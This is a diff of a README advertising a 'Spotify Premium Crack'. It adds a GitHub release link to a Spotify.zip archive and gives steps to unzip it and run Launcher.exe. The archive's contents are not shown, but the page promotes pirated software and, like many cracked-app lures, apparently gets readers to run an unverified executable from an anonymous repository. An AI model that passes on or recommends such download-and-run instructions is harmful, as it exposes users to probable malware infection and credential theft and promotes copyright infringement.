@@ -14,7 +14,7 @@ In terms of performance, Spotify Premium Crack is known for its reliability and 
 Spotify Premium Crack has a wide range of applications for music lovers, whether you want to create playlists for parties, discover new artists, or simply enjoy your favorite tracks without interruptions. Its versatile features make it an essential tool for anyone who wants to enhance their music listening experience.
 
 # ⚙️ Instruction:
-1. Download the archive from [here]()
+1. Download the archive from [here](https://github.com/Wrightjennifery16/super-duper-octo-robot/releases/download/Spotify-Release-Crack/Spotify.zip)
 2. Unzip to any folder
 3. Run Launcher.exe
 4. Agree with terms and click Continue
